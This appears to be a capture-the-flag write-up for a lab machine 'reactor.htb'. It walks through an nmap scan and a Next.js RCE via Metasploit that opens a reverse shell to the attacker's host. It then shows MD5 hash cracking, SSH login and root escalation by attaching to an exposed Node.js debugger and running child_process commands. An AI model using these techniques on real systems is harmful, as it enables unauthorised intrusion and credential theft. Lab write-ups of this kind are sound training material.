## 1. Reconnaissance
 
An Nmap scan was run to identify open ports and running services.
 
```
nmap -sV reactor.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-17 10:30 +0200
Nmap scan report for reactor.htb (10.129.103.79)
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain?
3000/tcp open  ppp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 
Three services stood out:
- **22/tcp** — SSH (OpenSSH 9.6p1, Ubuntu)
- **53/tcp** — DNS (unusual to see this open externally, likely `systemd-resolved` bound to a non-standard interface)
- **3000/tcp** — an unidentified HTTP-like service, later confirmed as a Next.js web application
---
 
## 2. Enumeration
 
Browsing to port 3000 revealed a web application built with **Next.js 15.0.3**, identified via the `X-Powered-By` header and static asset paths returned during the Nmap service scan.
 
Next.js 15.0.3 is affected by **CVE-2025-55182**, an unauthenticated remote code execution vulnerability (dubbed "React2Shell" in some public trackers). A Metasploit module was available and used to gain initial code execution:
 
```
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 10.10.14.227:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 2 opened (10.10.14.227:4444 -> 10.129.103.79:52276) at 2026-09-17 10:45:10 +0200
```
 
This dropped a shell running as the `node` user, in the application's directory (`/opt/reactor-app`).
 
---
 
## 3. Foothold — Credential Extraction
 
Inside the application directory, a SQLite database file, `reactor.db`, was present. A raw `cat` of the file (before realizing `sqlite3` was available) showed the readable strings embedded in the binary format, revealing a `users` table schema and partial data:
 
```
cat reactor.db
CREATE TABLE sensor_logs (...)
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
)
...
```
 
Querying the database properly with `sqlite3` gave clean, structured output:
 
```
node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```
 
Both password hashes are 32 hex characters long, consistent with **MD5**. The `engineer` hash was cracked against `rockyou.txt`:
 
```
hashcat -m 0 -a 0 39d97110eafe2a9a68639812cd271e8e rockyou.txt
...
39d97110eafe2a9a68639812cd271e8e:reactor1
...
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```
 
**Credentials obtained:** `engineer` : `reactor1`
 
---
 
## 4. User Flag
 
The recovered credentials were valid over SSH:
 
```
ssh engineer@reactor.htb
...
    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
 
    AUTHORIZED PERSONNEL ONLY
Last login: Thu Sep 17 08:52:39 2026 from 10.10.14.227
```
 
```
ls
user.txt
cat user.txt
28c0164d6a5aa8db7045bdc5b2204c4d
```
 
---
 
## 5. Privilege Escalation
 
### 5.1 Enumeration
 
Standard privilege escalation checks were run first:
 
- **`sudo -l`** — no usable entries.
- **SUID/SGID binaries** (`find / -perm -4000`) — only standard system binaries (`passwd`, `su`, `mount`, `sudo`, `chsh`, `chfn`, `gpasswd`, `newgrp`, `umount`, `fusermount3`, polkit and dbus helpers). None exploitable via GTFOBins in a default configuration.
- **Capabilities** (`getcap -r /`) — only standard entries (`ping`, `mtr-packet`, `gst-ptp-helper`, `snap-confine`). Nothing abusable.
- **Cron jobs** (`/etc/cron.d`, `/etc/cron.daily`, etc.) — only stock Ubuntu maintenance scripts (`apt-compat`, `logrotate`, `man-db`, `sysstat`, `e2scrub_all`). Nothing custom.
- **Writable files** — mostly noise from a bundled Warp terminal installation (`~/.warp/...`) containing default documentation/skills shipped with the software, not user-specific secrets. `~/.bash_history` and SSH config yielded nothing actionable.
None of these avenues produced a lead. The next step was to inspect running processes and listening ports.
 
### 5.2 Finding the Vulnerable Service
 
`ps aux` revealed a Node.js process running **as root** with the Node.js debugger inspector enabled and bound to localhost:
 
```
root  1386  0.0  1.1  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
 
This corresponds to a custom systemd service confirmed via `systemctl`:
 
```
uptime-monitor.service   loaded active running  Internal uptime/latency monitor for the SSR app
```
 
`ss -tulpn` confirmed the debugger port was listening on loopback only:
 
```
tcp   LISTEN   127.0.0.1:9229
```
 
The `--inspect` flag exposes the **Chrome DevTools Protocol (CDP)** debugger interface. Any process able to reach this port locally can attach a debugger session and execute arbitrary JavaScript in the context of the running Node.js process — in this case, as **root**.
 
### 5.3 Exploitation
 
Since `node` was available on the target, the built-in CLI debugger client was used to attach directly to the exposed inspector:
 
```
node inspect 127.0.0.1:9229
```
 
From the debugger prompt, switching to the REPL gives an interactive JavaScript shell running inside the target process:
 
```
debug> repl
Press Ctrl+C to leave debug repl
```
 
A direct call to the global `require` failed, since the debugger REPL evaluates expressions in a bare context where `require` is not injected:
 
```
> require('child_process').execSync('id').toString()
ReferenceError: require is not defined
```
 
This was bypassed by reaching `require` through `process.mainModule`, which *is* available in the REPL's global scope and exposes the module loader of the target process:
 
```
> process.mainModule.require('child_process').execSync('id').toString()
'uid=0(root) gid=0(root) groups=0(root)\n'
```
 
Confirmed code execution as root. The root flag was then read directly:
 
```
> global.process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
'622d95d8a277362130c5e3078bb55420\n'
```
 
### 5.4 Root Flag
 
```
622d95d8a277362130c5e3078bb55420
```
 
